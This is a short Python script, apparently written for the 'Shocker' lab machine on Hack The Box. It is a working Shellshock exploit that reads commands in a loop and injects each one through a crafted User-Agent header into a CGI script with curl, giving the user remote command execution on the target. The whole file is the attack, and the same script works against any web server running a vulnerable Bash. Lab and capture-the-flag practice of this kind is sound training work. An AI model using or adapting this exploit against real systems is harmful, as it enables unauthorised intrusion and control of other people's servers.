import os
#command=raw_input("$") 
site = "http://shocker.htb/cgi-bin/user.sh" 
while True: 
        command=raw_input("$ ")
        os.system("curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '%s '\" %s" %(command,site))
        if command == "STOP":
                break
